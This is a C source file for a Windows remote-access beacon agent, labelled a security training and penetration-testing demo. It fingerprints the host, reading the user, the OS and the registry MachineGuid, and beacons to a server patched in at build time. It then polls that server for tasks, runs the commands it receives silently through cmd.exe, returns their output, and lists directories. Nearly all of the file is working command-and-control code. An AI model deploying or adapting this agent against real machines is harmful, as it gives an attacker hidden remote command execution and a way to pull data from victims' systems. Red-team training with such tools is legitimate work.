/*
 * Security Training Demo — Windows Beacon Agent (Native C)
 * Cross-compiled with: x86_64-w64-mingw32-gcc -O2 -s -o agent.exe win_agent.c -lwinhttp -lws2_32
 *
 * Pure WinHTTP polling agent. No reverse shell.
 * Beacons system info, long-polls /tunnel for tasks, executes via cmd.exe.
 *
 * FOR AUTHORIZED SECURITY TRAINING / PENETRATION TESTING ONLY.
 */

#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <winhttp.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#pragma comment(lib, "winhttp")
#pragma comment(lib, "ws2_32")

/* ---- CONFIG (patched at build time) ---- */
#define SERVER_HOST L"%%SERVER_HOST%%"
#define SERVER_PORT %%SERVER_PORT%%
/* ---------------------------------------- */

#define MAX_RESPONSE  (1024 * 256)
#define MAX_CMD_OUT   (1024 * 128)
#define BEACON_PATH   L"/beacon"
#define TUNNEL_PATH   L"/tunnel"
#define USER_AGENT    L"SecurityTrainingDemo/1.0"
#define TUNNEL_TIMEOUT_MS  35000
#define RETRY_DELAY_MS     5000

/* ---- Simple JSON helpers (no library needed) ---- */

static void json_escape(const char *src, char *dst, int max) {
    int j = 0;
    for (int i = 0; src[i] && j < max - 2; i++) {
        if (src[i] == '"') { dst[j++] = '\\'; dst[j++] = '"'; }
        else if (src[i] == '\\') { dst[j++] = '\\'; dst[j++] = '\\'; }
        else if (src[i] == '\n') { dst[j++] = '\\'; dst[j++] = 'n'; }
        else if (src[i] == '\r') { dst[j++] = '\\'; dst[j++] = 'r'; }
        else if (src[i] == '\t') { dst[j++] = '\\'; dst[j++] = 't'; }
        else if ((unsigned char)src[i] >= 0x20) { dst[j++] = src[i]; }
    }
    dst[j] = 0;
}

/* Extract a string value for a key from JSON. Very basic — good enough for our protocol. */
static int json_get_string(const char *json, const char *key, char *out, int maxout) {
    char needle[128];
    snprintf(needle, sizeof(needle), "\"%s\"", key);
    const char *p = strstr(json, needle);
    if (!p) { out[0] = 0; return 0; }
    p = strchr(p + strlen(needle), ':');
    if (!p) { out[0] = 0; return 0; }
    while (*p == ' ' || *p == ':') p++;
    if (*p == '"') {
        p++;
        int i = 0;
        while (*p && *p != '"' && i < maxout - 1) {
            if (*p == '\\' && *(p + 1)) { p++; }
            out[i++] = *p++;
        }
        out[i] = 0;
        return i;
    }
    out[0] = 0;
    return 0;
}

/* ---- System info gathering ---- */

typedef struct {
    char hostname[256];
    char username[256];
    char os_version[256];
    char platform[512];
    char machine_id[64];
} SysInfo;

static void get_sys_info(SysInfo *info) {
    DWORD sz;

    sz = sizeof(info->hostname);
    GetComputerNameA(info->hostname, &sz);

    sz = sizeof(info->username);
    GetUserNameA(info->username, &sz);

    OSVERSIONINFOA ver;
    ver.dwOSVersionInfoSize = sizeof(ver);
    /* GetVersionEx is deprecated but works fine for our purposes */
    #pragma warning(suppress: 4996)
    GetVersionExA(&ver);
    snprintf(info->os_version, sizeof(info->os_version),
             "Windows %lu.%lu.%lu", ver.dwMajorVersion, ver.dwMinorVersion, ver.dwBuildNumber);

    SYSTEM_INFO si;
    GetNativeSystemInfo(&si);
    const char *arch = "Unknown";
    if (si.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_AMD64) arch = "x86_64";
    else if (si.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_INTEL) arch = "x86";
    else if (si.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_ARM64) arch = "ARM64";

    snprintf(info->platform, sizeof(info->platform),
             "Windows-%lu.%lu.%lu-%s",
             ver.dwMajorVersion, ver.dwMinorVersion, ver.dwBuildNumber, arch);

    /* Machine GUID as unique ID */
    HKEY hKey;
    info->machine_id[0] = '0';
    info->machine_id[1] = 0;
    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE,
        "SOFTWARE\\Microsoft\\Cryptography", 0, KEY_READ | KEY_WOW64_64KEY, &hKey) == ERROR_SUCCESS) {
        DWORD type, bufSize = sizeof(info->machine_id);
        RegQueryValueExA(hKey, "MachineGuid", NULL, &type, (LPBYTE)info->machine_id, &bufSize);
        RegCloseKey(hKey);
    }
}

static int get_battery_pct(void) {
    SYSTEM_POWER_STATUS ps;
    if (GetSystemPowerStatus(&ps) && ps.BatteryLifePercent <= 100)
        return ps.BatteryLifePercent;
    return -1; /* AC / unknown */
}

/* ---- HTTP POST helper ---- */

static int http_post(const wchar_t *path, const char *body, int bodyLen,
                     char *response, int responseMax, DWORD timeout_ms) {
    int ret = -1;
    HINTERNET hSession = WinHttpOpen(USER_AGENT, WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
                                     WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
    if (!hSession) return -1;

    WinHttpSetTimeouts(hSession, timeout_ms, timeout_ms, timeout_ms, timeout_ms);

    HINTERNET hConnect = WinHttpConnect(hSession, SERVER_HOST, SERVER_PORT, 0);
    if (!hConnect) { WinHttpCloseHandle(hSession); return -1; }

    HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"POST", path,
                                            NULL, WINHTTP_NO_REFERER,
                                            WINHTTP_DEFAULT_ACCEPT_TYPES, 0);
    if (!hRequest) { WinHttpCloseHandle(hConnect); WinHttpCloseHandle(hSession); return -1; }

    BOOL ok = WinHttpSendRequest(hRequest,
                                 L"Content-Type: application/json\r\n", -1,
                                 (LPVOID)body, bodyLen, bodyLen, 0);
    if (ok) ok = WinHttpReceiveResponse(hRequest, NULL);

    if (ok) {
        DWORD totalRead = 0;
        DWORD bytesRead;
        while (WinHttpReadData(hRequest, response + totalRead,
                               responseMax - totalRead - 1, &bytesRead) && bytesRead > 0) {
            totalRead += bytesRead;
            if ((int)totalRead >= responseMax - 1) break;
        }
        response[totalRead] = 0;
        ret = (int)totalRead;
    }

    WinHttpCloseHandle(hRequest);
    WinHttpCloseHandle(hConnect);
    WinHttpCloseHandle(hSession);
    return ret;
}

/* ---- Build beacon JSON ---- */

static int build_beacon_json(const SysInfo *info, const char *msg_type,
                             const char *extra_fields, char *buf, int bufSize) {
    char hn[512], un[512], osv[512], plat[1024], mid[128];
    json_escape(info->hostname, hn, sizeof(hn));
    json_escape(info->username, un, sizeof(un));
    json_escape(info->os_version, osv, sizeof(osv));
    json_escape(info->platform, plat, sizeof(plat));
    json_escape(info->machine_id, mid, sizeof(mid));

    int batt = get_battery_pct();
    const char *batt_str = batt >= 0 ? "" : "\"?\"";

    int n;
    if (batt >= 0) {
        n = snprintf(buf, bufSize,
            "{\"device\":\"%s\",\"android_id\":\"%s\","
            "\"android\":\"%s\",\"api\":\"%s\","
            "\"fingerprint\":\"%s\",\"type\":\"%s\","
            "\"os_type\":\"windows\",\"battery_pct\":%d,"
            "\"network_type\":\"LAN\",\"installed_apps_count\":\"N/A\""
            "%s%s}",
            hn, mid, osv, un, plat, msg_type,
            batt,
            extra_fields ? "," : "", extra_fields ? extra_fields : "");
    } else {
        n = snprintf(buf, bufSize,
            "{\"device\":\"%s\",\"android_id\":\"%s\","
            "\"android\":\"%s\",\"api\":\"%s\","
            "\"fingerprint\":\"%s\",\"type\":\"%s\","
            "\"os_type\":\"windows\",\"battery_pct\":\"AC\","
            "\"network_type\":\"LAN\",\"installed_apps_count\":\"N/A\""
            "%s%s}",
            hn, mid, osv, un, plat, msg_type,
            extra_fields ? "," : "", extra_fields ? extra_fields : "");
    }
    return n;
}

/* ---- Execute command via cmd.exe ---- */

static int execute_command(const char *cmd, char *out_stdout, int maxStdout,
                           char *out_stderr, int maxStderr) {
    HANDLE hStdoutRead, hStdoutWrite, hStderrRead, hStderrWrite;
    SECURITY_ATTRIBUTES sa = { sizeof(sa), NULL, TRUE };

    if (!CreatePipe(&hStdoutRead, &hStdoutWrite, &sa, 0)) return -1;
    if (!CreatePipe(&hStderrRead, &hStderrWrite, &sa, 0)) {
        CloseHandle(hStdoutRead); CloseHandle(hStdoutWrite);
        return -1;
    }
    SetHandleInformation(hStdoutRead, HANDLE_FLAG_INHERIT, 0);
    SetHandleInformation(hStderrRead, HANDLE_FLAG_INHERIT, 0);

    STARTUPINFOA si;
    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESTDHANDLES;
    si.hStdOutput = hStdoutWrite;
    si.hStdError = hStderrWrite;
    si.hStdInput = GetStdHandle(STD_INPUT_HANDLE);

    PROCESS_INFORMATION pi;
    ZeroMemory(&pi, sizeof(pi));

    char cmdline[4096];
    snprintf(cmdline, sizeof(cmdline), "cmd.exe /c %s", cmd);

    BOOL ok = CreateProcessA(NULL, cmdline, NULL, NULL, TRUE,
                              CREATE_NO_WINDOW, NULL, NULL, &si, &pi);

    CloseHandle(hStdoutWrite);
    CloseHandle(hStderrWrite);

    int exitCode = -1;
    if (ok) {
        WaitForSingleObject(pi.hProcess, 25000); /* 25s timeout */

        DWORD ec;
        if (GetExitCodeProcess(pi.hProcess, &ec)) exitCode = (int)ec;
        if (ec == STILL_ACTIVE) {
            TerminateProcess(pi.hProcess, 1);
            exitCode = -1;
        }

        /* Read stdout */
        DWORD totalRead = 0, bytesRead;
        while (ReadFile(hStdoutRead, out_stdout + totalRead,
                        maxStdout - totalRead - 1, &bytesRead, NULL) && bytesRead > 0) {
            totalRead += bytesRead;
            if ((int)totalRead >= maxStdout - 1) break;
        }
        out_stdout[totalRead] = 0;

        /* Read stderr */
        totalRead = 0;
        while (ReadFile(hStderrRead, out_stderr + totalRead,
                        maxStderr - totalRead - 1, &bytesRead, NULL) && bytesRead > 0) {
            totalRead += bytesRead;
            if ((int)totalRead >= maxStderr - 1) break;
        }
        out_stderr[totalRead] = 0;

        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
    }

    CloseHandle(hStdoutRead);
    CloseHandle(hStderrRead);

    return exitCode;
}

/* ---- Handle task from server ---- */

static void handle_task(const SysInfo *info, const char *json_response) {
    char task[64], command[4096];
    json_get_string(json_response, "task", task, sizeof(task));

    if (strcmp(task, "shell_command") == 0) {
        json_get_string(json_response, "command", command, sizeof(command));

        char *cmd_stdout = (char *)malloc(MAX_CMD_OUT);
        char *cmd_stderr = (char *)malloc(MAX_CMD_OUT);
        if (!cmd_stdout || !cmd_stderr) { free(cmd_stdout); free(cmd_stderr); return; }

        cmd_stdout[0] = cmd_stderr[0] = 0;
        int ec = execute_command(command, cmd_stdout, MAX_CMD_OUT, cmd_stderr, MAX_CMD_OUT);

        /* Build result JSON */
        char *esc_stdout = (char *)malloc(MAX_CMD_OUT * 2);
        char *esc_stderr = (char *)malloc(MAX_CMD_OUT * 2);
        char *esc_cmd    = (char *)malloc(8192);
        char *extra      = (char *)malloc(MAX_CMD_OUT * 4 + 16384);
        if (esc_stdout && esc_stderr && esc_cmd && extra) {
            json_escape(cmd_stdout, esc_stdout, MAX_CMD_OUT * 2);
            json_escape(cmd_stderr, esc_stderr, MAX_CMD_OUT * 2);
            json_escape(command, esc_cmd, 8192);

            snprintf(extra, MAX_CMD_OUT * 4 + 16384,
                "\"task\":\"shell_command\",\"command\":\"%s\","
                "\"stdout\":\"%s\",\"stderr\":\"%s\",\"exit_code\":%d",
                esc_cmd, esc_stdout, esc_stderr, ec);

            char *body = (char *)malloc(MAX_CMD_OUT * 4 + 32768);
            if (body) {
                int n = build_beacon_json(info, "task_result", extra, body, MAX_CMD_OUT * 4 + 32768);
                char *resp = (char *)malloc(4096);
                if (resp) {
                    http_post(BEACON_PATH, body, n, resp, 4096, 10000);
                    free(resp);
                }
                free(body);
            }
        }
        free(esc_stdout); free(esc_stderr); free(esc_cmd); free(extra);
        free(cmd_stdout); free(cmd_stderr);
    }
    else if (strcmp(task, "show_message") == 0) {
        char msg[2048];
        json_get_string(json_response, "message", msg, sizeof(msg));
        MessageBoxA(NULL, msg, "Security Training Demo", MB_OK | MB_ICONINFORMATION);

        char extra[256];
        snprintf(extra, sizeof(extra), "\"task\":\"show_message\",\"status\":\"displayed\"");

        char body[8192];
        int n = build_beacon_json(info, "task_result", extra, body, sizeof(body));
        char resp[1024];
        http_post(BEACON_PATH, body, n, resp, sizeof(resp), 10000);
    }
    else if (strcmp(task, "list_files") == 0) {
        /* Use 'dir' command and parse, then report as shell_command for simplicity.
           For proper file listing, the Python agent (win_agent.py) handles it natively. */
        char dir_path[4096];
        json_get_string(json_response, "path", dir_path, sizeof(dir_path));
        if (!dir_path[0]) strcpy(dir_path, "C:\\");

        /* Build a dir /b command and send back as list_files response */
        WIN32_FIND_DATAA fd;
        char search[4200];
        snprintf(search, sizeof(search), "%s\\*", dir_path);

        /* Build JSON files array manually */
        char *files_json = (char *)malloc(MAX_CMD_OUT);
        if (!files_json) return;
        int pos = 0;
        int count = 0;
        pos += snprintf(files_json + pos, MAX_CMD_OUT - pos, "[");

        HANDLE hFind = FindFirstFileA(search, &fd);
        if (hFind != INVALID_HANDLE_VALUE) {
            do {
                if (strcmp(fd.cFileName, ".") == 0 || strcmp(fd.cFileName, "..") == 0) continue;
                int is_dir = (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) ? 1 : 0;
                ULARGE_INTEGER fileSize;
                fileSize.LowPart = fd.nFileSizeLow;
                fileSize.HighPart = fd.nFileSizeHigh;
                char esc_name[512];
                json_escape(fd.cFileName, esc_name, sizeof(esc_name));
                if (count > 0 && pos < MAX_CMD_OUT - 2) files_json[pos++] = ',';
                pos += snprintf(files_json + pos, MAX_CMD_OUT - pos,
                    "{\"name\":\"%s\",\"is_dir\":%s,\"size\":%llu,\"modified\":0,\"readable\":true}",
                    esc_name, is_dir ? "true" : "false", (unsigned long long)fileSize.QuadPart);
                count++;
                if (pos >= MAX_CMD_OUT - 256) break;
            } while (FindNextFileA(hFind, &fd));
            FindClose(hFind);
        }
        pos += snprintf(files_json + pos, MAX_CMD_OUT - pos, "]");

        char esc_path[8192];
        json_escape(dir_path, esc_path, sizeof(esc_path));

        char *extra = (char *)malloc(MAX_CMD_OUT + 16384);
        if (extra) {
            snprintf(extra, MAX_CMD_OUT + 16384,
                "\"task\":\"list_files\",\"path\":\"%s\",\"files\":%s,\"file_count\":%d",
                esc_path, files_json, count);
            char *body2 = (char *)malloc(MAX_CMD_OUT + 32768);
            if (body2) {
                int n2 = build_beacon_json(info, "task_response", extra, body2, MAX_CMD_OUT + 32768);
                char resp2[4096];
                http_post(BEACON_PATH, body2, n2, resp2, sizeof(resp2), 10000);
                free(body2);
            }
            free(extra);
        }
        free(files_json);
    }
}

/* ---- Main ---- */

int WINAPI WinMain(HINSTANCE hInst, HINSTANCE hPrev, LPSTR lpCmd, int nShow) {
    (void)hInst; (void)hPrev; (void)lpCmd; (void)nShow;

    SysInfo info;
    get_sys_info(&info);

    /* Initial heartbeat beacon */
    char *body = (char *)malloc(8192);
    char *resp = (char *)malloc(MAX_RESPONSE);
    if (!body || !resp) return 1;

    int n = build_beacon_json(&info, "heartbeat", NULL, body, 8192);
    http_post(BEACON_PATH, body, n, resp, 4096, 10000);

    /* Main tunnel loop */
    while (1) {
        n = build_beacon_json(&info, "tunnel_poll", NULL, body, 8192);
        int ret = http_post(TUNNEL_PATH, body, n, resp, MAX_RESPONSE, TUNNEL_TIMEOUT_MS);

        if (ret > 0) {
            char task[64];
            json_get_string(resp, "task", task, sizeof(task));
            if (task[0] && strcmp(task, "") != 0) {
                handle_task(&info, resp);
            }
        } else {
            Sleep(RETRY_DELAY_MS);
        }
    }

    free(body);
    free(resp);
    return 0;
}
